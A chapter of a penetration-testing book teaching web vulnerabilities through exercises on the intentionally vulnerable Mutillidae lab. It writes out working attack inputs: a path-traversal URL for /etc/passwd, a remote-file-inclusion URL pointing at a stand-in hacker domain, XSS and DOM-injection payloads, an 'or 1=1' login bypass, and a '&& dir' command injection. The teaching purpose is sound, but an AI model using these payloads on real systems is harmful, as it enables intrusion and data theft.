<html><head></head><body><div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Understanding Web Application Vulnerabilities</h1>
                </header>
            
            <article>
                
<p class="mce-root">This chapter is going to be your main pillar of application security. You will learn the logic behind the most popular vulnerabilities in this field. Most attacks that are executed remotely use the web application infrastructure to get in. Finding a vulnerability such as SQL Injection on a site can be very harmful, as the attacker can take complete control of the server.</p>
<p>Web applications are written in different programming languages, but the most popular ones are Java, .NET, and PHP. These days, we see a shift in web application programming, where the JavaScript language or the frontend takes an important part. Companies are using light-weight frontend technologies such as AngularJS to implement the idea of Single-Page Applications. As an application security pentester, you need to be aware of the vulnerabilities that exist for these types of technologies because developers tend to use these shiny functionalities without understanding the security risks that come with them.</p>
<p>So, this chapter will explain attacks that can happen to a web application, and after finishing it, you will be able to use your skills to manually manipulate your findings during pentests. In this chapter, you will learn about the following important topics:</p>
<ul>
<li>Remote and Local File Inclusion </li>
<li><strong>Cross-Site Scripting</strong> (<strong>XSS</strong>)</li>
<li><strong>Cross-Site Request Forgery</strong> (<strong>CSRF</strong>)</li>
<li><strong>SQL Injection</strong> (<strong>SQLi</strong>)</li>
<li>Command Injection</li>
<li>OWASP Top 10 List</li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">File Inclusion</h1>
                </header>
            
            <article>
                
<p>As the name suggests, this vulnerability can be exploited by including a file in the URL (by entering the path). The file that was included can be local to the server, and thus be called <strong>Local File Inclusion</strong>, or it (the path of the file) can point to a remote file, and thus be called a <strong>Remote File Inclusion</strong>.</p>
<p>Modern programming languages and web servers have built-in mechanisms to protect against this flaw. Unfortunately, in real life, you will encounter a lot of applications developed by legacy programming languages such as JSP (Java), ASP (Microsoft), and PHP, so the chance of finding a similar vulnerability is still there. One problem that can cause this issue is when the developer forgets to include a validation on the server side.</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Local File Inclusion</h1>
                </header>
            
            <article>
                
<p><strong>Local File Inclusion</strong> (<strong>LFI</strong>) is exploited by including a file path in the URL that points to the local web server that hosts the web application. This vulnerability, when exploited, will allow directory traversal characters (such as dot-dot-slash) to be injected.</p>
<p class="mce-root">Consider the following example:</p>
<pre class="mce-root">http://domain_name/index.php?file=hackme.html</pre>
<p class="mce-root">What if I can change the <kbd>hackme</kbd> file to another file on the web server system? Let's check it out!</p>
<pre class="mce-root">http://domain_name/index.php?file=../../../../etc/passwd</pre>
<p class="mce-root">Interesting, right? This will load the <kbd>passwd</kbd> file on a Linux Web Server. Let's see a more concrete example using Mutillidae:</p>
<ol>
<li class="mce-root">Browse to the Mutillidae homepage and select <span class="packt_screen">OWASP 2017</span> from the left menu, then <span class="packt_screen">Broken Access Control</span> | <span class="packt_screen">Insecure Direct Object References</span>, and after that, click on <span class="packt_screen">Arbitrary File Inclusion</span>:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/fc68a497-ee64-4ca4-af1e-677fc38967be.png" width="990" height="585"/></div>
<ol start="2">
<li class="mce-root">Look at the URL, do you see the same pattern that we just saw together?</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/bac93bbf-0b5f-4442-a21c-0c3055d02a46.png" width="1525" height="508"/></div>
<ol start="3">
<li class="mce-root">Let's try to see whether we can display a file from the server:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/5c137226-15c4-48b9-980b-17d5bf230405.png" width="1845" height="360"/></div>
<p class="mce-root">Voila! I just exploited this vulnerability. Now, try it yourself.</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Remote File Inclusion</h1>
                </header>
            
            <article>
                
<p class="mce-root"><strong>Remote File Inclusion</strong> (<strong>RFI</strong>) is exploited by including a file path in the URL that points to the remote file outside the boundaries of the web server that hosts the web application.</p>
<p class="mce-root">Consider the following example:</p>
<pre class="mce-root">http://domain_name/index.php?file=http://hacker_domain/malware.php</pre>
<p class="mce-root">In the preceding URL, the victim server will load the <kbd>malware.php</kbd> page that resides on the hacker's server. Let's see a practical example using Mutillidae:</p>
<ol start="1">
<li class="mce-root">Browse to the Mutillidae homepage and select <span class="packt_screen">OWASP 2017</span>. We will choose the same menu that we used previously for the Local File Inclusion, that is, <span><span class="packt_screen">Broken Access Control </span></span>| <span><span class="packt_screen">Insecure Direct Object References </span></span>| <span><span class="packt_screen">Arbitrary File Inclusion</span></span>.</li>
<li class="mce-root">So, it's the same page that we tested for the Local File Inclusion but now, we will see if we can include a remote file. Before exploiting this vulnerability, we need to change a few things at the server level first. This page provides you with the help for changing the config file on the server. I will log into the web server and change the <kbd>php.ini</kbd> file under <kbd>C:\xampp\php\</kbd> (your path will be different if you're using Linux to host Mutillidae):</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/272546aa-e68a-4963-b07a-7de690a06c43.png" width="720" height="654"/></div>
<ol start="3">
<li class="mce-root">Now that we have changed the configs, restart the web server using the XAMPP Control Panel. Let's see if we can hack this page. So, change the URL and let it point to and load another site, <kbd>http://ethicalhackingblog.com</kbd>:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/d030faaa-d5c6-48da-b8cd-e305ea5e9603.png" width="1805" height="984"/></div>
<p><span><span>As you can see I was able to load my blogging website inside the Mutillidae application. Imagine a hacker loading his infected website inside another application that is accessible to millions of people, such as Facebook, or your client/employer website; the damage could be disastrous.</span></span></p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Cross-Site Scripting</h1>
                </header>
            
            <article>
                
<p class="mce-root"><strong>Cross-Site Scripting</strong> (<strong>XSS</strong>), is exploited when the attacker can successfully execute any type of script (for example, JavaScript) on the victim's browser. These types of flaws exist because the developer did not validate the request or correctly encoded the response of the application. JavaScript is not the only script language used for XSS but it is the most common (in fact it's my favorite); attackers sometimes use scripting languages such as VBScript, ActiveX, Flash, and many more.</p>
<p class="mce-root">XSS is very popular and I encounter it every day while testing web applications. Every time I see a message displayed on the page that reflects a user input or behavior, then most probably it is vulnerable to XSS. But don't worry, with experience and practice, things will become more obvious to you as well. There are three types of XSS attacks: <strong>Stored</strong>, <strong>Reflected</strong>, and <strong>DOM Injection</strong>. Let's start with the easiest to understand, the reflected XSS.</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Reflected XSS</h1>
                </header>
            
            <article>
                
<p class="mce-root">This flaw is exploited often when the page displays to the user something that can be manipulated dynamically through a URL or in the body of the page. Nothing is better than a visual example so let's see a reflected XSS case using Mutillidae:</p>
<ol>
<li class="mce-root">In your Kali Linux, open your browser and go to the Homepage, then on the left Menu, choose <span class="packt_screen">OWASP 2017 </span>| <span class="packt_screen">Cross Site Scripting </span>| <span class="packt_screen">Reflected </span>| <span class="packt_screen">DNS Lookup</span>. The first thing that you need to test is the happy path, so let's enter a real IP address (for this example, I will use the IP <kbd>10.0.0.1</kbd> which is my home router) and click on the <span class="packt_screen">Lookup DNS</span> button:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/9df0c55d-d7bb-49ab-b8a8-311a449f0ece.png" width="1334" height="670"/></div>
<ol start="2">
<li class="mce-root">As you can see, the page has displayed the IP address that we just entered. This means that if I replace the IP address with a JavaScript code, it will execute it. In the textbox, replace the IP address with a test script, <kbd>&lt;script&gt;alert(1)&lt;/script&gt;</kbd>:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/85fdcd68-6932-4bc9-9393-91ce925c5175.png" style="width:29.33em;height:10.92em;" width="546" height="203"/></div>
<ol start="3">
<li class="mce-root">Click on the <span class="packt_screen">Lookup DNS</span> button and see if this script will execute:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/ba165874-4227-4642-816d-b33d77000095.png" style="width:32.83em;height:19.67em;" width="675" height="404"/></div>
<p><span><span>In this example, I used the <kbd>alert(1)</kbd> JavaScript, and that's probably all you need during the penetration tests. On the other hand, a hacker will use a more sophisticated JavaScript logic to collect personal information from its victim.</span></span></p>
<div class="packt_tip">For more advanced XSS attacks check out <strong>Beef XSS Framework</strong> on your Kali Linux host. After using this tool you will be amazed by the attack choices that an XSS vulnerability can bring to the table.</div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Stored XSS</h1>
                </header>
            
            <article>
                
<p>The second type of attack is stored XSS. Exploiting this one will be accomplished by saving the script (JavaScript) into a stored location through a page (for example, Blogs, CMS, Forums) into some sort of a storage file (for example, database, file, and logs). This flaw is dangerous because it is persisted and will execute when anyone visits the infected page later. Imagine that on Facebook (or any social media platform), you can submit a post that contains a JavaScript code that will execute by anyone who sees that post; amazing, right?</p>
<p>Please don't try it on Facebook - I'm just giving an example here, you don't want to get yourself in trouble! (By the way, Facebook and other big companies offers bug bounty programs and they will pay you money if you find any bugs).</p>
<p>That's why we have Mutillidae; to test our concept and check how things work:</p>
<ol>
<li>Go to the homepage of Mutillidae, then on the left menu, choose <span class="packt_screen">OWASP 2017 </span>| <span class="packt_screen">Cross Site Scripting </span>| <span class="packt_screen">Persistent </span>| <span class="packt_screen">Add to your blog</span>:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/9a648e7d-4020-4407-890d-5d92129a2351.png" width="1621" height="646"/></div>
<ol start="2">
<li>Same as before, we will try to insert the same JavaScript alert that we did before and try to execute it by clicking on the <span class="packt_screen">S<strong>ave Blog Entry</strong></span> button (but this time, it will be stored as a blog):</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/46a21ef1-1296-490c-9fdf-e08df6957321.png" width="1082" height="491"/></div>
<p class="mce-root CDPAlignLeft CDPAlign">Now, every time a user visits this blog, he or she will be prompted when the page loads with the JavaScript alert because it's stored in the database.</p>
<p> </p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Exploiting stored XSS using the header</h1>
                </header>
            
            <article>
                
<p>Another interesting example that I would like to share with you is using the header to inject JavaScript into the page. Tricky right? But don't be surprised to see that the nature of web applications will allow us to manipulate the web page through the header.</p>
<p>Let's visualize this case so you can understand things better:</p>
<ol>
<li><span>Go to the homepage of Mutillidae then on the left menu, choose <span class="packt_screen">OWASP 2017 </span>| <span class="packt_screen">Cross Site Scripting </span>| <span class="packt_screen">Persistent</span>| <span class="packt_screen">Show Log</span>:</span></li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/61535c9b-ec47-476d-88c7-7e660cd120ce.png" width="1592" height="449"/></div>
<ol start="2">
<li>This page records every visit to the Mutillidae application. The third column stores the <span class="packt_screen">Browser Agent</span> value of the visitor. What if that visitor is malicious and replaces his browser agent with JavaScript using Burp?</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/3da42edd-402c-4dd1-b124-054ce70ba03e.png" width="748" height="350"/></div>
<ol start="3">
<li>So, I will intercept the page using the <span class="packt_screen">Proxy</span> tab in Burp, then modify the Browser Agent with a JavaScript alert and forward it to the server (using the <span class="packt_screen">Forward</span> button):</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/d823e34d-89d3-4fee-a66e-43f83dee368e.png" width="1270" height="332"/></div>
<p>Voila! This is the result of changing the user agent of our browser using our XSS trick in Burp. Again, this is a persistent XSS and every time the admin of the site visits this page, he or she will be prompted with our payload.</p>
<p> </p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">DOM XSS</h1>
                </header>
            
            <article>
                
<p>In the first two types above, we've used the HTML to exploit the XSS vulnerability. DOM XSS injection, however, is accomplished through the JavaScript code instead of the HTML elements. Let's see a practical example:</p>
<ol>
<li>G<span>o to the homepage of Mutillidae, then on the left Menu, choose <span class="packt_screen">OWASP 2017 </span>| Cr<span class="packt_screen">oss-Site Scripting </span>| <span class="packt_screen">DOM-Based </span>| <span class="packt_screen">Password Generator</span>.</span></li>
</ol>
<p style="padding-left: 60px">This page uses the username query string value (which is anonymous in this case) to display on the page (it shows in the message <span class="packt_screen">This password is for [username]</span>).</p>
<ol start="2">
<li>First, let's try to change the anonymous username value to <kbd>gus</kbd> in the URL:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/bb031df2-a069-45d5-930f-e0f8779e76d3.png" width="1181" height="565"/></div>
<ol start="3">
<li class="mce-root">Let's inspect the page source by hitting the <em>F12</em> key on your keyboard, and see if we can analyze it. In the developer inspector section of Firefox, hit <em>Ctrl</em> + <em>F</em> to find the word <kbd>gus</kbd> in the DOM. The first match shows you the HTML part and the second one shows you the JavaScript part:</li>
</ol>
<pre style="padding-left: 60px">&lt;script&gt;try{ document.getElementById("idUsernameInput").innerHTML = "This password is for gus"; }catch(e){ alert("Error: " + e.message); }// end catch&lt;/script&gt;</pre>
<ol start="4">
<li class="mce-root">Looking at the results, we can manipulate the DOM string to look legit and executable in JavaScript:</li>
</ol>
<pre style="padding-left: 60px">try{document.getElementById("idUsernameInput").innerHTML = "This password is for   ";}catch(e){};alert(1);try{v=" ";}catch(e){alert("Error: " + e.message);}</pre>
<ol start="5">
<li class="mce-root">Then, go to the <span class="packt_screen">Decoder</span> tab in Burp/Decoder and paste the value there to encode it as an URL (in the right section select <span class="packt_screen">Encode as...</span> then select URL from the dropdown list):</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/a1a530db-bed8-415e-a052-00904193f822.png" width="934" height="160"/></div>
<ol start="6">
<li class="mce-root">Finally, let's paste the encoded result in the <span class="packt_screen">Password Generator</span> page URL. Hit the refresh button in your browser and you should get an alert:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/657ac18d-c372-4553-b01b-c0923e50db59.png" width="1204" height="461"/></div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">JavaScript validation</h1>
                </header>
            
            <article>
                
<p>What if the page is protected by JavaScript validation, do you think we still can hack it? Of course we can; the JavaScript validation is not enough—we should do it on the server as well. Let's see how to overcome JavaScript using Burp:</p>
<ol>
<li>First, we will switch the security level to 1, which will enable JavaScript validation, by clicking on the <strong><span class="packt_screen">Toggle Security</span></strong> button in the Mutillidae menu bar:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/7205fec2-33d0-442c-becb-4243e7f43129.png" width="1023" height="117"/></div>
<ol start="2">
<li>Try to visit the same page above from the menu; o<span>n the left menu, choose <span class="packt_screen">OWASP 2017 </span>| <span class="packt_screen">Cross Site Scripting </span>| <span class="packt_screen">Reflected </span>| <span class="packt_screen">DNS Lookup</span> </span>and let's try to execute our alert script:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/5df9510f-e162-48eb-9e77-fd42e5a29fb7.png" style="width:26.17em;height:9.42em;" width="555" height="199"/></div>
<p style="padding-left: 60px" class="mce-root">As you can see, the script was blocked by the browser, it didn't even allow me to continue typing my script because of the validation rule applied to the textbox field. But this should not be a reason to stop us from going forward; I will enable the proxy in my browser (as I showed you in the previous chapter) and start Burp/Proxy to intercept the request:</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/233caa85-4e52-402b-81a6-c54ed2770280.png" style="width:35.75em;height:23.58em;" width="663" height="437"/></div>
<ol start="3">
<li class="mce-root">I will change the <kbd>target_host</kbd> value and insert my alert script. Next, let's forward it to the server (using the <span class="packt_screen">Forward</span> button):</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/5f410111-bbf7-4090-adb7-b74dacf061d1.png" style="width:42.25em;height:25.50em;" width="704" height="425"/></div>
<p style="padding-left: 60px" class="mce-root">Check this out! The JavaScript has executed successfully:</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/5daeb0be-427b-41bb-a23c-e1f39e21352a.png" style="width:29.92em;height:20.25em;" width="596" height="404"/></div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Cross-Site Request Forgery</h1>
                </header>
            
            <article>
                
<p><span>A <strong>Cross-Site Request Forgery</strong> (<strong>CSRF</strong>) (some people pronounce it as</span> <span><em>sea surf</em>), can be exploited when an attacker takes advantage of the user session to perform state-changing requests such as posting to a social network platform, money transfers, and much more.</span></p>
<p><span>This attack will involve some social engineering efforts from the attacker to convince the victim to visit the infected site. Imagine that the victim is an admin of a system, then the attacker can manipulate that system if it doesn't have a CSRF protection. The most popular question in interviews for Application Security Engineer positions is the following: <em>What is the difference between XSRF and XSS? </em>The simpler the answer is, the better. In summary, XSS attacks rely on executing JavaScript in the victim's browser, while XSRF relies on taking advantage of the victim's session. Next time you have an interview, keep that in mind, maybe it will get you your dream job!</span></p>
<p><span>First of all, you need to understand an important basic concept. When you first authenticate to a website, a session cookie will be created uniquely for you and this cookie will remain until it expires. Another tricky thing about this concept is that your session cookie will remain even if you browse to another site (for example, the attacker site). Let's take a look at an example of CSRF:</span></p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Step 01 – victim</h1>
                </header>
            
            <article>
                
<p>The poor victim in this scenario will log into his account using the login page of Mutillidae. Once in, he browses to his blog page (using the left menu and then selecting <span class="packt_screen">OWASP 2017</span> | <span class="packt_screen">CSRF</span> | <span class="packt_screen">Add to your blog</span>). He uses his blog to add a new article (you know the guy is a super blogger!):</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/c27254ef-6e66-4faa-af34-77e5a26939c4.png" style="width:35.25em;height:16.33em;" width="1120" height="518"/></div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Step 02 – attacker</h1>
                </header>
            
            <article>
                
<p>On the other hand, the attacker has already accessed the same blog site and he has a different account that he uses to blog about anonymous activities on a daily basis. The attacker saw that this site is already vulnerable to Cross-Site Request Forgery using his favorite scanner, Burp. Next, he will build a malicious page to infect his victims. To build his page, he enabled the proxy/intercept in Burp to analyze the contents of the web requests. On the <span class="packt_screen">Intercept</span> page, he will right-click on the request and try to generate a CSRF POC:</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/2ea37056-11d3-41d4-b5a0-0d508e016f80.png" width="950" height="720"/></div>
<p>After that, a new pop-up window will show. At this moment, the attacker can take the generated HTML code and use it by copying the contents (using the <span class="packt_screen">Copy HTML</span> button) generated by Burp:</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/ffe55a27-821c-4f63-b7fb-97ae7d96c51c.png" width="800" height="704"/></div>
<p>Then, Elliot, the attacker, takes this HTML code and saves it on his Kali machines' web server (he copied the HTML file to the <kbd>/var/www/html/</kbd> directory and later started his Apache server using the command <kbd>service apache2 start</kbd>):</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/c5e6b56f-827c-4b78-aec1-fda47c73a910.png" width="1055" height="289"/></div>
<p>Now, Elliot's server is ready for his victim to visit. He used social engineering tactics to convince his victim to go to that page and click this magic button:</p>
<div class="packt_infobox">For this attack to work, the victim needs to be already signed in using Mutillidae. Remember, we will use his session, so we need it to be active by having the victim logged in to the system.</div>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/716b77e0-3182-439f-9063-18fe7fe9ca59.png" style="width:28.42em;height:10.67em;" width="482" height="181"/></div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Results</h1>
                </header>
            
            <article>
                
<p>After clicking on this button (the <span class="packt_screen">Submit request</span> button), the victim will be surprised when he visits his blog page and sees a blog that he did not save. Oops! Too bad Mr. Victim, that's because the blog is vulnerable to a CSRF flaw!</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/26945e0b-3789-4db7-a6a7-487f90b06a09.png" width="1614" height="535"/></div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">SQL Injection</h1>
                </header>
            
            <article>
                
<p>The SQL Injection is my favorite one, and it's the most dangerous one that you will encounter in your career. An SQL Injection vulnerability will allow a malicious user to execute SQL commands on the database through the web browser. The cause of this problem is like any other web vulnerability; the developer forgot to add any validation on the server side to protect against SQLi attacks.</p>
<p>Here's the most interesting part; an SQLi vulnerability will allow you to do the following:</p>
<ul>
<li>Query the database using a <kbd>select</kbd> statement (for example, select the users table, thereby extracting the usernames and passwords)</li>
<li>Bypass the login page by executing successful query results (you'll see an example soon)</li>
<li>Execute system commands in the database in order to compromise the web server</li>
<li>Execute inserts/delete commands to manipulate the records in the database</li>
</ul>
<p>It's time to see some actions folks! You will be shocked to see how powerful this vulnerability can be to a system.</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Authentication bypass</h1>
                </header>
            
            <article>
                
<p>When a user tries to authenticate to a system, the backend will execute a query that looks like this (for this example I'm using the credentials that I use to log in to Mutillidae):</p>
<pre>select * from users where username='gus' and password='password123'</pre>
<p>After executing the preceding query, the database will check if the record exists and if yes (the record exists) then a Boolean <kbd>True</kbd> value is returned and the user is authenticated. Hackers will take advantage of this theory to trick the database with a query that will always return a <kbd>True</kbd> value:</p>
<pre>select * from users where username ='admin<strong>' or 1=1 --</strong> and password = ''</pre>
<p><kbd>or 1=1</kbd> will always return a true value and the <kbd>--</kbd> symbol is telling MySQL that everything after it is a comment, so it will ignore the rest of the query; tricky right?</p>
<p>To test this idea in Mutillidae, in the menu, select: <span class="packt_screen">OWASP 2017</span> | <span class="packt_screen">Injection SQL</span> | <span class="packt_screen">SQLi - Bypasss Authentication</span> | <span class="packt_screen">Login.</span></p>
<p>Once you're on the login page, enter the magic query that we saw previously to bypass the authentication of this page (sometimes you have to enter a space character after the <kbd>--</kbd> for this query to work):</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/b51e1cb5-bbb8-48c4-8543-2ea89915a3ea.png" style="width:25.83em;height:14.42em;" width="423" height="236"/></div>
<p>Check this out, folks! I'm a super admin authenticated user (see the following screenshot):</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/30b736fe-bba7-4529-b52f-6b5b12f8a3fb.png" width="1200" height="294"/></div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Extracting the data from the database</h1>
                </header>
            
            <article>
                
<p>Most of the leaked online passwords are done through this kind of attack. If you encounter this vulnerability during your pentests then it means you just hit the jackpot. The idea here is to be able to execute the famous query:</p>
<pre>select * from users</pre>
<p>Assuming that the database has a users table, this query will extract all the user's records from the database. It's like Christmas day; you're going to have all the usernames and passwords in a wrapped gift.</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Error-based SQLi enumeration</h1>
                </header>
            
            <article>
                
<p>This technique relies on manipulating any input (for example, query string) to the backend and waiting for an error message to appear.</p>
<p>Nothing is better than a real example, so let me show you one using Mutillidae:</p>
<ol>
<li>In the home page of Mutillidae, select the following item from the left menu: <span class="packt_screen">OWASP 2017</span> | <span class="packt_screen">Injection SQL</span> | <span class="packt_screen">SQLi - Extract Data</span> | <span class="packt_screen">User Info (SQL)</span>.</li>
</ol>
<ol start="2">
<li>In the <span class="packt_screen">User Lookup</span> page, enter your credentials and hit the <span class="packt_screen">View Account Details</span> button:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/20e2b93f-38a5-4700-bc38-bbbcf2a4458d.png" style="width:28.83em;height:11.50em;" width="529" height="211"/></div>
<p style="padding-left: 60px">This page is executing a query in the backend to get our username and password. Let's enter a single quote <kbd>'</kbd> in the name field and check the results (the single quote):</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/9a91645d-1559-488a-b472-57ed42fbc8a7.png" width="1591" height="592"/></div>
<p style="padding-left: 60px">As you can see at the bottom, we have an error message telling us that the SQL server did not understand our single quote:</p>
<pre style="padding-left: 60px">select * from accounts where username='<strong>'</strong>' and password=''</pre>
<ol start="3">
<li>In other words (in the hacker world), the SQL database has executed our single quote, hence, we can write our own query to extract data from the database. If we try to execute the magic query that we used to bypass the login page (<kbd>admin' or 1=1 --</kbd> ), then guess what? The database will be happy to return all the records in the accounts table:</li>
</ol>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/42092b0c-9d00-488f-9ea6-a873af4fb1ed.png" width="1074" height="560"/></div>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Blind SQLi</h1>
                </header>
            
            <article>
                
<p>When we don't have a verbose error message and the database still executes a query in the backend, then we can blindly SQL inject our query: it's called <strong>Blind SQL Injection</strong>. You can use the same examples shown previously, but assume that the server will not return an error message for you. In the end, you can still execute the magic query (<kbd>admin' or 1=1 --</kbd>).</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">Command Injection</h1>
                </header>
            
            <article>
                
<p class="mce-root">Command Injection is very simple, you just exploit it by executing commands on a web page because it allows you to do so. In other words, if you ever see a page that offers the functionality of executing a command in the backend, then it's probably vulnerable to this attack. Command Injection is very popular in <span><strong>Capture the Flag</strong> (<strong>CTF</strong>) because it allows you to completely own a remote machine (the machine that hosts the web application).</span></p>
<p>As usual, let's see a practical example using Mutillidae. Open the left menu  <span class="packt_screen">OWASP 2017</span> | <span class="packt_screen">Injection</span> | <span class="packt_screen">Command Injection</span> | <span class="packt_screen">DNS Lookup</span>:</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/bde5d290-7055-4588-bc6a-141aa9d646f4.png" width="1336" height="678"/></div>
<p class="mce-root">This page executes the DNS Lookup command in the backend. In this example, I entered the IP address <kbd>10.0.0.1</kbd> and clicked on the <strong><span class="packt_screen">Lookup DNS</span></strong> button.</p>
<p class="mce-root">Do you think we can override the normal behavior of this page and execute any command of our liking? (Or maybe execute a backdoor such as <kbd>netcat</kbd><span>, just a hint). Let's analyze the functionality on this page first. We are passing the IP address (or hostname) as a variable to a function in the backend that executes most probably in the following way:</span></p>
<pre class="mce-root">nslookup [domain name variable]</pre>
<p class="mce-root">If we're lucky and the developer didn't validate it, we can append other commands after the variable and the application will be happy to execute it for us. Our goal is to make the backend execute something like this:</p>
<pre class="mce-root">nslookup [domain name variable] &amp;&amp; [other command]</pre>
<p class="mce-root">Let's see if this is going to work! For the POC, I will use the <kbd>dir</kbd> command (since it's a Windows machine that hosts Mutillidae).</p>
<p class="mce-root">I will enter the IP address and the <kbd>dir</kbd> command in the <span class="packt_screen">Hostname/IP</span>: <kbd>10.0.0.1 &amp;&amp; dir</kbd> and click on the <span class="packt_screen">Lookup DNS</span> button:</p>
<div class="mce-root CDPAlignCenter CDPAlign"><img src="Images/d4b6ae29-8760-4808-a4da-ae8746892390.png" width="1271" height="836"/></div>
<p class="mce-root CDPAlignLeft CDPAlign">Amazing! The <kbd>dir</kbd> command has executed successfully!</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">OWASP Top 10</h1>
                </header>
            
            <article>
                
<p>In the preceding section, you've seen the most important web application vulnerabilities in the OWASP Top 10. The OWASP list includes even more items than what you have witnessed up until now. Application Security Professionals always keep the OWASP Top 10 as a reference in their career. This list is always kept up to date by the OWASP community and the latest version is the one that you saw in the Mutillidae Menu <span class="packt_screen">OWASP Top 10 – 2017</span>; if you're reading this book in the future then there will probably be a newer list.</p>
<p>If <span>you have any doubts about the understanding of any of the top 10 items, then don't worry, because we will revisit those items one more time in the web intrusion tests later in this book with more practical examples; for the time being, try to see the big picture.</span></p>
<p>Let's take a look at the Top 10 items in a simplified way so you can understand these vulnerabilities from a high-level overview.</p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">1 – Injection</h1>
                </header>
            
            <article>
                
<p>Injection flaws can happen when an attacker can inject and execute a custom command in the backend because of missing sanitization. In this chapter, you've seen SQL Injection and Command Injection but there are more, for example, LDAP, XPath, NoSQL,<strong> </strong><span><strong>Object Relational Mapping</strong> (<strong>ORM</strong>) tool, XML Parsers, and SMTP Headers (and the list is increasing over time).</span></p>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">2 – Broken Authentication</h1>
                </header>
            
            <article>
                
<p>This flaw occurs when a hacker finds the user's identity, credentials (both username and password), or web session. This can happen when a system:</p>
<ul>
<li>Allows automated attacks, where the attacker can guess valid usernames and passwords</li>
<li>Permits brute force or other automated attacks</li>
<li>Allows default, weak, or well-known passwords, such as <kbd>Password123</kbd></li>
<li>Uses weak or ineffective credential recovery and forgot-password methods</li>
<li>Uses plain text, encrypted, or weakly hashed passwords</li>
<li>Exposes Session IDs in the URL</li>
<li>Does not manage the Session properly after a successful login</li>
</ul>


            </article>

            
        </section>
    </div>



  
<div id="sbo-rt-content"><section>

                            <header>
                    <h1 class="header-title">3 – Sensitive Data</h1>
                </header>
            
            <article>
                
<p><span>This flaw occurs when the web application handles confidential information in clear text, either at rest (for example, a database connection string password in clear text) or in transit (for example, HTTP instead of HTTPS). In practice, you need to look for the following issues:</span></p>
<ul>
<li><span>Missing security headers (I will show you the security headers in upcoming chapters when we talk about secure coding practices)</span></li>
<li><span>Any weak cipher algorithms used at rest or in transit (for example, MD5)</span></li>
